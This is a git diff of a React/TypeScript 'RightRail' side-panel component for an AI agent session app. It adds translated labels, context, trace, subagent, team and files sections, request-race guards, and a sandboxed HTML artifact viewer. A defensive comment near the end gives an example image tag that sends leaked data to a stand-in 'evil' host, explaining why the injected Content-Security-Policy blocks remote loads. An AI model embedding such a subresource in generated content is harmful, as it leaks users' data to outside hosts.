@@ -1,19 +1,41 @@
 import { useEffect, useRef, useState, type ReactNode } from "react";
+import type { SessionSandbox } from "./SandboxChip";
+import { useTranslation } from "react-i18next";
 // Emits the asset URL only; the worker itself loads lazily with the pdfjs chunk.
 import pdfWorkerUrl from "pdfjs-dist/build/pdf.worker.min.mjs?url";
 import {
+  getAgentTasks,
   getArtifacts,
+  getJournalCases,
+  getRoots,
   readArtifact,
   revealArtifact,
+  type AgentTaskInfo,
   type ArtifactContent,
   type ArtifactInfo,
+  type Board,
+  type JournalCase,
+  type RootInfo,
 } from "../api";
-import type { TodoItem } from "../types";
+import { relativeTime } from "./ConnectorMessageCard";
+import { AgentGlyph } from "./AgentGlyph";
+import type { ContextInfo, SessionInfo, TodoItem } from "../types";
 import { AccessSection } from "./AccessSection";
-import { Icon } from "./Icon";
-import { Markdown, OPEN_ARTIFACT_EVENT } from "./Markdown";
+import { ContextPanel, ContextSummary } from "./RailContext";
+import { BoardSection } from "./BoardPanel";
+import { TeamRail } from "./TeamRail";
+import type { TeamSummary } from "../teamView";
+import type { TraceRow } from "../obs3";
+import { TraceIndex } from "./TraceIndex";
+import { RailStretchContext, StretchButton, useRailStretchState } from "../railStretch";
+import type { WorkerFilter } from "../teamRoster";
 
-type Panel = "progress" | "artifacts";
+import { Icon } from "./Icon";
+import type { SessionUsage } from "../types";
+import { Markdown, OPEN_ARTIFACT_EVENT } from "./Markdown";
+// (ContextInfo/SessionUsage power the Context section; see RailContext.tsx.)
+
+type Panel = "context" | "progress" | "trace" | "agents" | "artifacts" | "board" | "journal" | "team" | "files";
 
 // Quiet file-type icons for the artifact list (the colored kind pills read as noisy).
 function kindIcon(kind: string): "file" | "fileCode" | "image" | "table" {
@@ -38,6 +60,7 @@ function kindFromPath(path: string): string {
 
 interface Props {
   active: boolean;
+  teamView?: ReactNode;
   sessionId: string;
   refreshKey: number;
   toolNames: string[];
@@ -46,9 +69,8 @@ interface Props {
   // Fires when a full artifact preview opens/closes, so the app can auto-collapse the left nav
   // to give the preview (PDF/webpage/sheet) more room (#3).
   onPreviewChange?: (open: boolean) => void;
-  // §32: the rail is the ONE session panel for every non-chat persona. Artifacts stays
-  // cowork-only (deliverables; code-family gets "Files" later — slot reserved); the Access
-  // section (the former Session-settings drawer) renders for all.
+  // §32: the rail is the ONE session panel for every persona. Artifacts (scratch-side
+  // deliverables), Files (all roots), and Access all render for every session (UX-036/037).
   showArtifacts?: boolean;
   personaId?: string;
   projectScoped?: boolean;
@@ -57,10 +79,50 @@ interface Props {
   scratchPrimary?: boolean;
   openAccessKey?: number;
   onOpenIntegrations?: () => void;
+  // FB-015: window occupancy for the Context section (from `ready`/assistant_message).
+  context?: ContextInfo | null;
+  // Per-model token totals for the Context section's model rows.
+  sessionUsage?: SessionUsage;
+  // Bumped by agent_task events; the Subagents section refetches its registry.
+  agentTaskKey?: number;
+  // Environment block: where this session runs. Absent machineName = this machine.
+  machineName?: string;
+  machineOffline?: boolean;
+  // OPE-219: the session's sandbox, for the Access section's Sites group.
+  sandbox?: SessionSandbox | null;
+  onSandbox?: (next: SessionSandbox) => void;
+  onOpenSandboxSettings?: () => void;
+  // Agent teams (OPE-96): App owns board data (the plan gate needs it too);
+  // the rail renders the summary section and the expand affordance.
+  board?: Board | null;
+  onExpandBoard?: () => void;
+  onOpenBoardItem?: (id: number) => void;
+  // Drawer restructure (seventeenth pass): the team lives HERE, not in the sidebar —
+  // member rows + the # team chat row. `isLead` also suppresses Progress (the board
+  // is the lead's progress surface).
+  isLead?: boolean;
+  teamMembers?: SessionInfo[];
+  teamChatEnabled?: boolean;
+  teamChatUnread?: number;
+  // Tokens by model for the lead plus its workers (spec §5) — shown under the members.
+  teamUsage?: SessionUsage;
+  onOpenTeamChat?: () => void;
+  onOpenWorker?: (s: SessionInfo) => void;
+  onOpenTeamView?: () => void;
+  onOpenWorkers?: (filter: WorkerFilter) => void;
+  teamSummary?: TeamSummary | null;
+  teamMachine?: string;
+  // Bumped when a [.](board:) chip in the transcript is clicked — expands the Board section.
+  openBoardKey?: number;
+  // UX-060: the trace index — one row per message of yours; a row goes to the message and
+  // opens its turn's trace. The section is the one way into the trace from the rail.
+  traceRows?: TraceRow[];
+  onOpenTrace?: (row: TraceRow) => void;
 }
 
 export function RightRail({
   active,
+  teamView,
   sessionId,
   refreshKey,
   toolNames,
@@ -75,51 +137,189 @@ export function RightRail({
   scratchPrimary,
   openAccessKey = 0,
   onOpenIntegrations,
+  context = null,
+  sessionUsage,
+  agentTaskKey = 0,
+  machineName,
+  machineOffline = false,
+  sandbox = null,
+  onSandbox,
+  onOpenSandboxSettings,
+  board,
+  onExpandBoard,
+  onOpenBoardItem,
+  isLead = false,
+  teamMembers = [],
+  teamChatEnabled = false,
+  teamChatUnread = 0,
+  teamUsage,
+  onOpenTeamChat,
+  onOpenWorker,
+  onOpenTeamView,
+  onOpenWorkers,
+  teamSummary,
+  teamMachine,
+  openBoardKey = 0,
+  traceRows = [],
+  onOpenTrace,
 }: Props) {
+  const { t } = useTranslation();
+  // UX-060: full width for the rail's wide form (trace, artifact), remembered per device.
+  const stretch = useRailStretchState();
+  // Seventeenth pass: every panel starts collapsed and nothing auto-expands — a count
+  // chip is the maximum signal. One exception survives (solo sessions only): Progress
+  // still auto-opens the first time a live turn has todos.
   const [open, setOpen] = useState<Record<Panel, boolean>>({
-    progress: true,
-    artifacts: true,
+    context: false,
+    progress: false,
+    trace: false,
+    agents: false,
+    artifacts: false,
+    board: false,
+    journal: false,
+    team: false,
+    files: false,
   });
+  const autoOpenedProgress = useRef(false);
+  useEffect(() => {
+    if (!isLead && running && todo.length > 0 && !autoOpenedProgress.current) {
+      autoOpenedProgress.current = true;
+      setOpen((prev) => ({ ...prev, progress: true }));
+    }
+  }, [running, todo.length, isLead]);
+  // A board chip in the transcript deep-links here: expand the Board section.
+  const seenBoardKey = useRef(openBoardKey);
+  useEffect(() => {
+    if (openBoardKey === seenBoardKey.current) return;
+    seenBoardKey.current = openBoardKey;
+    setOpen((prev) => ({ ...prev, board: true }));
+  }, [openBoardKey]);
   const [artifacts, setArtifacts] = useState<ArtifactInfo[]>([]);
+  // UX-037 Files: the session's roots (workspace/scratch/grants) — the entry points of
+  // the file explorer.
+  const [rootDirs, setRootDirs] = useState<RootInfo[]>([]);
+  const [journal, setJournal] = useState<JournalCase[]>([]);
   const [selected, setSelected] = useState<ArtifactInfo | null>(null);
   const [content, setContent] = useState<ArtifactContent | null>(null);
+  const artifactListRequest = useRef(0);
+  const artifactContentRequest = useRef(0);
+  const sessionRef = useRef(sessionId);
+  sessionRef.current = sessionId;
 
-  const refreshArtifacts = () => getArtifacts(sessionId).then(setArtifacts).catch(() => setArtifacts([]));
+  // Every refresh owns a monotonically increasing request id. Session switches, live refreshes,
+  // and manual refreshes can overlap; only the newest response may update this rail.
+  const refreshArtifacts = (
+    onLoaded?: (list: ArtifactInfo[]) => void,
+    onError?: () => void,
+  ) => {
+    const request = ++artifactListRequest.current;
+    return getArtifacts(sessionId)
+      .then((list) => {
+        if (request !== artifactListRequest.current) return;
+        setArtifacts(list);
+        onLoaded?.(list);
+      })
+      .catch(() => {
+        if (request !== artifactListRequest.current) return;
+        setArtifacts([]);
+        onError?.();
+      });
+  };
 
+  const loadArtifactContent = (artifact: ArtifactInfo) => {
+    const request = ++artifactContentRequest.current;
+    setContent(null);
+    return readArtifact(sessionId, artifact.path)
+      .then((next) => {
+        if (request === artifactContentRequest.current) setContent(next);
+      })
+      .catch(() => {
+        if (request === artifactContentRequest.current) setContent(null);
+      });
+  };
+
+  // Artifacts are session-owned. Drop the previous session's visible state before starting
+  // this session's fetch so filenames never linger while the replacement request is pending.
   useEffect(() => {
-    if (!active) return;
-    if (showArtifacts) refreshArtifacts();
-  }, [active, sessionId, refreshKey, showArtifacts]);
-
-  // Switching conversations closes any open artifact — it belongs to the previous session's
-  // workspace, which the new session can't (and shouldn't) read.
-  useEffect(() => {
+    artifactListRequest.current += 1;
+    artifactContentRequest.current += 1;
+    setArtifacts([]);
     setSelected(null);
     setContent(null);
   }, [sessionId]);
 
   useEffect(() => {
-    setContent(null);
-    if (!selected) return;
-    readArtifact(sessionId, selected.path).then(setContent).catch(() => setContent(null));
+    if (!active || !showArtifacts) {
+      artifactListRequest.current += 1;
+      return;
+    }
+    refreshArtifacts();
+    return () => {
+      artifactListRequest.current += 1;
+    };
+  }, [active, sessionId, refreshKey, showArtifacts]);
+
+  useEffect(() => {
+    if (!active) return;
+    getRoots(sessionId).then(setRootDirs).catch(() => setRootDirs([]));
+  }, [active, sessionId, refreshKey]);
+
+  // Async subagents (OPE-257): the registry view, refetched on every agent_task event.
+  const [agentTasks, setAgentTasks] = useState<AgentTaskInfo[]>([]);
+  useEffect(() => setAgentTasks([]), [sessionId]);
+  useEffect(() => {
+    if (!active) return;
+    getAgentTasks(sessionId).then(setAgentTasks).catch(() => setAgentTasks([]));
+  }, [active, sessionId, refreshKey, agentTaskKey]);
+
+  // Journal cases surface only when a board exists — same visibility rule as the
+  // Board section, so plain sessions carry zero team chrome.
+  useEffect(() => {
+    if (!active || !board?.space) {
+      setJournal([]);
+      return;
+    }
+    getJournalCases(sessionId).then(setJournal).catch(() => setJournal([]));
+  }, [active, sessionId, refreshKey, board?.space]);
+
+  useEffect(() => {
+    if (selected) loadArtifactContent(selected);
+    else {
+      artifactContentRequest.current += 1;
+      setContent(null);
+    }
+    return () => {
+      artifactContentRequest.current += 1;
+    };
   }, [selected?.path, sessionId]);
 
   // Notify the app when a preview opens/closes (drives the left-nav auto-collapse).
+  // Edge-triggered on the ACTUAL transition — a callback-identity change must never
+  // replay "open" while the viewer sits open (that re-collapsed a nav the user had
+  // just expanded; owner-hit 2026-08-21).
+  const prevPreviewOpen = useRef(false);
   useEffect(() => {
-    onPreviewChange?.(!!selected);
-  }, [!!selected, onPreviewChange]);
+    const open = !!selected || !!teamView;
+    if (open !== prevPreviewOpen.current) {
+      prevPreviewOpen.current = open;
+      onPreviewChange?.(open);
+    }
+  }, [!!selected, !!teamView, onPreviewChange]);
+  useEffect(() => { if (teamView) { setSelected(null); setContent(null); } }, [!!teamView]);
 
   const reloadSelected = () => {
     if (!selected) return Promise.resolve();
-    setContent(null);
-    return readArtifact(sessionId, selected.path).then(setContent).catch(() => setContent(null));
+    return loadArtifactContent(selected);
   };
 
   // §34 (UX-016): [Title](artifact:path) chips in the transcript open the viewer directly.
   // Resolve against the loaded list first; on a miss, refresh once (the file may be
   // seconds old), then fall back to a minimal record — readArtifact validates the path.
+  // Registered even while the rail is HIDDEN (owner-hit 2026-08-15): the chip fires ONE
+  // event, and App's unhide listener and this one race it — gating this on `active`
+  // dropped the selection, so the first click only opened an empty rail.
   useEffect(() => {
-    if (!active) return;
+    if (!sessionId) return;
     const minimal = (path: string): ArtifactInfo => ({
       path,
       name: path.split("/").pop() || path,
@@ -137,22 +337,36 @@ export function RightRail({
         setSelected(found);
         return;
       }
-      getArtifacts(sessionId)
+      // Not routed through the list request id: App unhides the rail on this same
+      // event, and that refresh would supersede this one and drop the selection
+      // (owner-hit 2026-10-25). Only a session switch mid-flight discards the answer.
+      const owner = sessionId;
+      getArtifacts(owner)
         .then((list) => {
+          if (owner !== sessionRef.current) return;
           setArtifacts(list);
           setSelected(match(list, path) ?? minimal(path));
         })
-        .catch(() => setSelected(minimal(path)));
+        .catch(() => {
+          if (owner === sessionRef.current) setSelected(minimal(path));
+        });
     };
     window.addEventListener(OPEN_ARTIFACT_EVENT, onOpen);
     return () => window.removeEventListener(OPEN_ARTIFACT_EVENT, onOpen);
-  }, [active, sessionId, artifacts]);
+  }, [sessionId, artifacts]);
 
   if (!active) return null;
 
   return (
-    <aside className={"right-rail" + (selected ? " artifact-mode" : "")}>
-      {selected ? (
+    <RailStretchContext.Provider value={stretch}>
+    <aside className={"right-rail" + (selected || teamView ? " artifact-mode" : "") + ((selected || teamView) && stretch.stretched ? " stretched" : "")}>
+      {teamView && !stretch.stretched && <div className="team-resize-handle" role="separator" aria-label={t("teamview.resize")} aria-orientation="vertical" tabIndex={0}
+        onKeyDown={e => { if (e.key !== "ArrowLeft" && e.key !== "ArrowRight") return; e.preventDefault(); const width = e.currentTarget.parentElement!.getBoundingClientRect().width + (e.key === "ArrowLeft" ? 32 : -32); document.documentElement.style.setProperty("--team-rail-w", Math.min(window.innerWidth * .75, Math.max(320, width)) + "px"); }}
+        onPointerDown={e => { e.preventDefault(); e.currentTarget.setPointerCapture(e.pointerId); }}
+        onPointerMove={e => { if (e.currentTarget.hasPointerCapture(e.pointerId)) document.documentElement.style.setProperty("--team-rail-w", Math.min(window.innerWidth * .75, Math.max(320, window.innerWidth - e.clientX)) + "px"); }}
+        onPointerUp={e => e.currentTarget.releasePointerCapture(e.pointerId)} />}
+      {teamView ? teamView :
+      selected ? (
         <ArtifactViewer
           sessionId={sessionId}
           artifact={selected}
@@ -166,18 +380,203 @@ export function RightRail({
               kind: kindFromPath(path),
               size: 0,
               modified_at: 0,
+              origin: selected?.origin,
             })
           }
         />
       ) : (
         <>
-          <RailSection title="进度" open={open.progress} onToggle={() => setOpen({ ...open, progress: !open.progress })}>
-            <ProgressSummary running={running} toolNames={toolNames} todo={todo} />
-          </RailSection>
+          {/* Environment: where this session runs — machine, folder+branch, sandbox.
+              Identity at a glance, not config: Access stays the config surface (§32). */}
+          <div className="rail-env" data-testid="rail-env">
+            <div className="rail-env-row">
+              <Icon name="monitor" size={15} />
+              <span className="rail-env-main">{machineName || t("rail.env_this_machine")}</span>
+              {machineOffline && <span className="rail-env-tag">{t("rail.env_offline")}</span>}
+            </div>
+            <div className="rail-env-row" title={scratchPrimary ? undefined : workspace}>
+              <Icon name="folder" size={15} />
+              <span className="rail-env-main">
+                {scratchPrimary || !workspace
+                  ? t("root.temporary_space")
+                  : workspace.split("/").pop() || workspace}
+              </span>
+              {!scratchPrimary && branch && (
+                <span className="rail-env-sub">
+                  <Icon name="branch" size={12} /> {branch}
+                </span>
+              )}
+            </div>
+            {sandbox && sandbox.state !== "off" && (
+              <button
+                className="rail-env-row rail-env-btn"
+                data-testid="rail-env-sandbox"
+                onClick={onOpenSandboxSettings}
+                title={t("rail.env_sandbox_open")}
+              >
+                <Icon name="shield" size={15} />
+                <span className="rail-env-main">
+                  {sandbox.state !== "sandboxed"
+                    ? t("rail.env_not_sandboxed")
+                    : sandbox.provider
+                      ? t("rail.env_sandboxed", { provider: sandbox.provider })
+                      : t("rail.env_sandboxed_plain")}
+                </span>
+                <span className={"rail-env-dot " + (sandbox.state === "sandboxed" ? "ok" : "warn")} />
+              </button>
+            )}
+          </div>
+
+          {/* Context (FB-015): how full the window is. The header carries the value;
+              the composer's ring (UX-048) stays the always-on glance. */}
+          {context && (
+            <RailSection
+              title={t("rail.context_title")}
+              summary={<ContextSummary info={context} />}
+              open={open.context}
+              onToggle={() => setOpen({ ...open, context: !open.context })}
+            >
+              <ContextPanel info={context} usage={sessionUsage} />
+            </RailSection>
+          )}
+
+          {/* Leads carry no Progress panel — the board IS the lead's progress surface. */}
+          {!isLead && (
+            <RailSection
+              title={t("rail.progress_title")}
+              summary={
+                running
+                  ? t("rail.sum_working")
+                  : todo.length
+                    ? t("rail.sum_done_of", { done: todo.filter((i) => i.status === "done").length, total: todo.length })
+                    : undefined
+              }
+              open={open.progress}
+              onToggle={() => setOpen({ ...open, progress: !open.progress })}
+            >
+              <ProgressSummary running={running} toolNames={toolNames} todo={todo} />
+            </RailSection>
+          )}
+
+          {/* UX-060: the trace index — the one way into the trace from the rail. A row per
+              message of yours; the header counts turns and issues. Nothing before the
+              first message. */}
+          {traceRows.length > 0 && onOpenTrace && (() => {
+            const issues = traceRows.reduce((n, r) => n + r.issues, 0);
+            return (
+              <RailSection
+                title={t("rail.trace_title")}
+                summary={
+                  t("rail.trace_turns", { count: traceRows.length }) +
+                  (issues ? " · " + t("rail.trace_issues", { count: issues }) : "")
+                }
+                summaryAttention={issues > 0}
+                open={open.trace}
+                onToggle={() => setOpen({ ...open, trace: !open.trace })}
+              >
+                <TraceIndex rows={traceRows} onPick={onOpenTrace} testId="rail-trace" />
+              </RailSection>
+            );
+          })()}
+
+          {/* Async subagents (OPE-257): active runs + done history, zero chrome when
+              none ever ran. Amber only while one waits on an approval. */}
+          {agentTasks.length > 0 && (() => {
+            const act = agentTasks.filter((a) => a.status === "running").length;
+            const waiting = agentTasks.filter((a) => a.status === "waiting").length;
+            const rest = agentTasks.length - act - waiting;
+            const parts = [
+              waiting ? t("rail.agents_waiting", { count: waiting }) : "",
+              act ? t("rail.agents_running", { count: act }) : "",
+              rest ? t("rail.agents_done", { count: rest }) : "",
+            ].filter(Boolean);
+            // Owner ruling 2026-11-07: ten or fewer = a row each; past ten the LIVE
+            // runs keep full rows (those you need to read) and only the done history
+            // compresses into the glyph grid, labels on hover.
+            const live = agentTasks.filter((a) => a.status === "running" || a.status === "waiting");
+            const compress = agentTasks.length > 10;
+            const rows = compress ? live : agentTasks;
+            const grid = compress ? agentTasks.filter((a) => !live.includes(a)) : [];
+            const statusLine = (a: AgentTaskInfo) =>
+              a.status === "waiting"
+                ? t("rail.agent_waiting")
+                : a.status === "running"
+                  ? t("rail.agent_running")
+                  : a.status === "error"
+                    ? t("rail.agent_error")
+                    : a.status === "canceled"
+                      ? t("rail.agent_canceled")
+                      : relativeTime(a.finished || a.created, t);
+            return (
+              <RailSection
+                title={t("rail.agents_title")}
+                summary={
+                  <>
+                    <span className="agent-chips" data-testid="agent-chips">
+                      {agentTasks.slice(0, 5).map((a) => (
+                        <AgentGlyph key={a.id} seed={a.icon_seed ?? 0} size={14} />
+                      ))}
+                    </span>
+                    {parts.join(" · ")}
+                  </>
+                }
+                summaryAttention={waiting > 0}
+                open={open.agents}
+                onToggle={() => setOpen({ ...open, agents: !open.agents })}
+              >
+                <div className="agent-list" data-testid="agent-tasks">
+                  {rows.map((a) => (
+                    <div className="agent-row" key={a.id} title={a.task}>
+                      <AgentGlyph seed={a.icon_seed ?? 0} size={18} />
+                      <span className="agent-label">
+                        <span className="agent-name">{a.label}</span>
+                        <span className={"agent-sub" + (a.status === "waiting" ? " attention" : "")}>
+                          {statusLine(a)}
+                        </span>
+                      </span>
+                      <span className={"agent-dot " + a.status} />
+                    </div>
+                  ))}
+                  {grid.length > 0 && (
+                    <div className="agent-grid" data-testid="agent-grid">
+                      {grid.map((a) => (
+                        <span key={a.id} className="agent-grid-item" title={`${a.label} · ${statusLine(a)}`}>
+                          <AgentGlyph seed={a.icon_seed ?? 0} size={17} />
+                        </span>
+                      ))}
+                    </div>
+                  )}
+                </div>
+              </RailSection>
+            );
+          })()}
+
+          {/* Standalone boards have no team icon. Keep their existing entry point;
+              staffed leads use the quick look and Team View instead. */}
+          {!isLead && board?.space && (() => {
+            const attention = board.items.filter((i) => i.state === "blocked" || i.state === "review").length;
+            const active = board.items.filter((i) => i.state === "open" || i.state === "in_progress").length;
+            return <RailSection title={t("rail.board_title")} open={open.board}
+              summary={attention ? t("rail.sum_board_attention", { count: attention }) : active ? t("rail.sum_board_open", { count: active }) : undefined}
+              summaryAttention={attention > 0}
+              onToggle={() => setOpen({ ...open, board: !open.board })}
+              action={<button className="rail-mini-btn" data-testid="board-expand" onClick={onExpandBoard} title={t("rail.board_expand")}><Icon name="panelOpen" size={13} /></button>}>
+              <BoardSection board={board} onExpand={() => onExpandBoard?.()} onOpenItem={onOpenBoardItem} />
+            </RailSection>;
+          })()}
+
+          {/* The team panel: who's working, on what, and the way into their sessions —
+              the altitude-3 escape hatch, moved here from the sidebar (RECENT keeps ONE
+              entry per team: the lead). */}
+          {teamMembers.length > 0 && <TeamRail key={sessionId} leadSessionId={sessionId} members={teamMembers} summary={teamSummary}
+            open={open.team} onToggle={() => setOpen({ ...open, team: !open.team })}
+            usage={teamUsage} machine={teamMachine} chatEnabled={teamChatEnabled} unread={teamChatUnread}
+            onChat={onOpenTeamChat} onWorker={onOpenWorker} onTeam={onOpenTeamView} onWorkers={onOpenWorkers} />}
 
           {showArtifacts && (
           <RailSection
-            title={`产出文件${artifacts.length ? ` (${artifacts.length})` : ""}`}
+            title={t("rail.artifacts_title")}
+            summary={artifacts.length ? String(artifacts.length) : undefined}
             open={open.artifacts}
             onToggle={() => setOpen({ ...open, artifacts: !open.artifacts })}
             action={
@@ -186,17 +585,17 @@ export function RightRail({
                   <button
                     className="rail-mini-btn"
                     onClick={(e) => { e.stopPropagation(); revealArtifact(sessionId, artifacts[0].path, "reveal"); }}
-                    title="显示这些文件所在的文件夹"
+                    title={t("rail.show_folder")}
                   >
                     <Icon name="folder" size={13} />
                   </button>
                 )}
-                <button className="rail-mini-btn" onClick={(e) => { e.stopPropagation(); refreshArtifacts(); }} title="刷新产出文件"><Icon name="refresh" size={13} /></button>
+                <button className="rail-mini-btn" onClick={(e) => { e.stopPropagation(); refreshArtifacts(); }} title={t("rail.refresh")}><Icon name="refresh" size={13} /></button>
               </>
             }
           >
             {artifacts.length === 0 ? (
-              <div className="rail-muted">还没有可预览的文件。</div>
+              <div className="rail-muted">{t("rail.artifacts_empty")}</div>
             ) : (
               <div className="artifact-list">
                 {artifacts.slice(0, 16).map((a) => (
@@ -208,7 +607,7 @@ export function RightRail({
                       {a.name}
                       <span className="artifact-row-meta">{formatBytes(a.size)} · {formatTime(a.modified_at)}</span>
                     </span>
-                    <span className="artifact-open">打开</span>
+                    <span className="artifact-open">{t("rail.open")}</span>
                   </button>
                 ))}
               </div>
@@ -216,26 +615,102 @@ export function RightRail({
           </RailSection>
           )}
 
+          {/* The More fold is gone (owner call 2026-08-20): every section lists flat,
+              collapsed by default — with Files added, one extra click hid half the
+              drawer for no gain. */}
+          {board?.space && journal.length > 0 && (
+            <RailSection
+              title={t("rail.journal_title")}
+              summary={String(journal.length)}
+              open={open.journal}
+              onToggle={() => setOpen({ ...open, journal: !open.journal })}
+            >
+              <div className="journal-list" data-testid="journal-list">
+                {journal.map((c) => (
+                  <div className="journal-row" key={c.case}>
+                    <Icon name="file" size={13} />
+                    <span className="journal-case">{c.case}</span>
+                    <span className="journal-count">{t("rail.journal_entries", { count: c.entries })}</span>
+                  </div>
+                ))}
+              </div>
+            </RailSection>
+          )}
+          {/* UX-037: Files — an explorer over the session's roots. Each root opens in
+              the artifact viewer, whose folder listings already click through; the
+              Artifacts section stays the curated scratch-only surface. */}
+          {rootDirs.length > 0 && (
+            <RailSection
+              title={t("rail.crumb_files")}
+              summary={String(rootDirs.length)}
+              open={open.files}
+              onToggle={() => setOpen({ ...open, files: !open.files })}
+            >
+              <div className="artifact-list" data-testid="files-roots">
+                {rootDirs.map((r) => (
+                  <button
+                    className="artifact-row"
+                    key={r.path}
+                    data-testid="files-root-row"
+                    onClick={() =>
+                      setSelected({
+                        path: r.path,
+                        abs_path: r.path,
+                        name: r.label || r.path.split("/").pop() || r.path,
+                        kind: "folder",
+                        size: 0,
+                        modified_at: 0,
+                        origin: "files",
+                      })
+                    }
+                    title={r.path}
+                  >
+                    <span className="artifact-ico">
+                      <Icon name="folder" size={17} />
+                    </span>
+                    <span className="artifact-name">
+                      {r.label || r.path.split("/").pop() || r.path}
+                      <span className="artifact-row-meta">
+                        {r.writable ? t("rail.root_read_write") : t("rail.root_read_only")}
+                        {!r.exists ? ` · ${t("root.missing")}` : ""}
+                      </span>
+                    </span>
+                    <span className="artifact-open">{t("rail.browse")}</span>
+                  </button>
+                ))}
+              </div>
+            </RailSection>
+          )}
+
           {/* §32: Access — the former Session-settings drawer, one section among peers.
               key: its data ownership resets with the conversation, like the old row did. */}
-          <AccessSection
-            key={sessionId}
-            sessionId={sessionId}
-            personaId={personaId}
-            projectScoped={projectScoped}
-            workspace={workspace}
-            branch={branch}
-            scratchPrimary={scratchPrimary}
-            openKey={openAccessKey}
-            onOpenIntegrations={onOpenIntegrations}
-          />
+          <div>
+            <AccessSection
+              key={sessionId}
+              sessionId={sessionId}
+              personaId={personaId}
+              projectScoped={projectScoped}
+              workspace={workspace}
+              branch={branch}
+              scratchPrimary={scratchPrimary}
+              openKey={openAccessKey}
+              onOpenIntegrations={onOpenIntegrations}
+              sandbox={sandbox}
+              onSandbox={onSandbox}
+              onOpenSandboxSettings={onOpenSandboxSettings}
+            />
+          </div>
         </>
       )}
     </aside>
+    </RailStretchContext.Provider>
   );
 }
 
+// The Board section's header chip: the attention states (blocked/review) when present,
+// otherwise a quiet active count. Full per-state summary stays on the topbar button.
 function ProgressSummary({ running, toolNames, todo }: { running: boolean; toolNames: string[]; todo: TodoItem[] }) {
+  const { t } = useTranslation();
   if (todo.length) {
     return (
       <div className="rail-todo-list">
@@ -247,7 +722,7 @@ function ProgressSummary({ running, toolNames, todo }: { running: boolean; toolN
         ))}
         {running && (
           <div className="rail-muted">
-            {toolNames.length ? `${toolNames.length} 次工具调用（截至目前）。` : "处理中…"}
+            {toolNames.length ? t("rail.tool_calls", { count: toolNames.length }) : t("rail.working")}
           </div>
         )}
       </div>
@@ -256,13 +731,13 @@ function ProgressSummary({ running, toolNames, todo }: { running: boolean; toolN
   if (running) {
     return (
       <div className="rail-muted">
-        正在处理此任务{toolNames.length ? `（目前已进行 ${toolNames.length} 次工具调用。）` : "。"}
+        {toolNames.length ? t("rail.working_task_with_tools", { count: toolNames.length }) : t("rail.working_task")}
       </div>
     );
   }
   return (
     <div className="rail-muted">
-      对于较长的多步骤任务，当 OpenWorker 规划、使用工具、等待审批并产出文件时，进度会显示在这里。
+      {t("rail.empty_state")}
     </div>
   );
 }
@@ -273,25 +748,55 @@ function RailSection({
   onToggle,
   children,
   action,
+  summary,
+  summaryAttention,
 }: {
   title: string;
   open: boolean;
   onToggle: () => void;
   children: ReactNode;
   action?: ReactNode;
+  // The header's maximum signal: a right-aligned, muted summary value — the collapsed
+  // header still answers "what's in here?". Amber only for attention states
+  // (blocked/review). Panels never shout louder than this.
+  summary?: ReactNode;
+  summaryAttention?: boolean;
 }) {
   return (
     <section className="rail-section">
       <div className="rail-section-head">
-        <button className="rail-section-toggle" onClick={onToggle}>
+        <button
+          className="rail-section-toggle"
+          data-testid={`rail-toggle-${title.toLowerCase()}`}
+          onClick={onToggle}
+        >
           <Icon name={open ? "chevronDown" : "chevronRight"} size={14} className="rail-chev" />
           <span>{title}</span>
+          {summary != null && (
+            <span className={"rail-summary" + (summaryAttention ? " attention" : "")}>{summary}</span>
+          )}
         </button>
         {action}
       </div>
       {open && <div className="rail-section-body">{children}</div>}
     </section>
   );
+}
+
+// OPE-91: agent-authored HTML is untrusted active content rendered inside the PRIVILEGED
+// app webview (Tauri IPC). The sandbox must therefore be airtight on two axes:
+//  - no `allow-same-origin`: with srcDoc, that flag would run the page same-origin with
+//    the app — scripts could reach the parent document and the IPC bridge.
+//  - no network: a poisoned report exfiltrates at DISPLAY time via subresources
+//    (<img src="https://evil/?leak=…">). The injected CSP allows inline style/script
+//    (what report interactivity needs) and data: images; everything remote is blocked.
+// Injected at position 0 so it takes effect before any content the page declares.
+const ARTIFACT_CSP =
+  '<meta http-equiv="Content-Security-Policy" content="default-src \'none\'; ' +
+  "style-src 'unsafe-inline'; script-src 'unsafe-inline'; img-src data:;\">";
+
+function sandboxHtml(html: string): string {
+  return ARTIFACT_CSP + html;
 }
 
 function ArtifactViewer({
@@ -310,22 +815,66 @@ function ArtifactViewer({
   // Folder listings: open a child entry in the viewer (files and subfolders alike).
   onOpenEntry?: (path: string) => void;
 }) {
+  const { t } = useTranslation();
   const [reloadKey, setReloadKey] = useState(0);
+  // UX-038: the ambiguous icon cluster collapsed into ONE labeled ⋯ menu; the
+  // breadcrumb parent is the back action and ✕ closes. Copy CONTENTS is the
+  // primary copy — the path copy (a 2026-07-12 tester fix) lives under it, labeled.
+  const [menuOpen, setMenuOpen] = useState(false);
+  const menuRef = useRef<HTMLDivElement | null>(null);
+  useEffect(() => {
+    if (!menuOpen) return;
+    const close = (e: MouseEvent) => {
+      if (!menuRef.current?.contains(e.target as Node)) setMenuOpen(false);
+    };
+    window.addEventListener("mousedown", close);
+    return () => window.removeEventListener("mousedown", close);
+  }, [menuOpen]);
   const isHtml = content?.kind === "html" && !content.error;
   // Best viewed in a real app: spreadsheets, PDFs, and Office docs (pptx/docx can't preview inline)
   const isApp = content?.kind === "sheet" || content?.kind === "pdf" || content?.kind === "office";
+  // Text-bearing kinds can copy their contents; images/PDFs/sheets have nothing textual to copy.
+  const copyableText = typeof content?.content === "string" && !content?.error;
+  const crumbRoot = artifact.origin === "files" ? t("rail.crumb_files") : t("rail.artifacts_title");
+  const item = (
+    testid: string,
+    icon: Parameters<typeof Icon>[0]["name"],
+    label: string,
+    onClick: () => void,
+  ) => (
+    <button
+      className="artifact-menu-item"
+      data-testid={testid}
+      onClick={() => {
+        setMenuOpen(false);
+        onClick();
+      }}
+    >
+      <Icon name={icon} size={14} />
+      <span>{label}</span>
+    </button>
+  );
 
   return (
     <div className="artifact-viewer">
       <div className="artifact-head">
-        <button className="artifact-icon-btn" onClick={onBack} aria-label="返回产出文件" title="返回">
-          <Icon name="arrowLeft" size={16} />
-        </button>
         <div className="artifact-heading">
-          <div className="artifact-title"><span>产出文件</span><span className="artifact-sep">/</span><span>{artifact.name}</span></div>
+          <div className="artifact-title">
+            <button
+              className="artifact-crumb-link"
+              data-testid="artifact-crumb-back"
+              onClick={onBack}
+              title={t("rail.back_to", { name: crumbRoot })}
+            >
+              {crumbRoot}
+            </button>
+            <span className="artifact-sep">/</span>
+            <span>{artifact.name}</span>
+          </div>
           <div className="artifact-path">{artifact.path}</div>
         </div>
         <div className="rail-actions">
+          <StretchButton className="artifact-icon-btn" labels={{ stretch: t("rail.stretch"), unstretch: t("rail.unstretch") }} />
           {isHtml && (
             <button
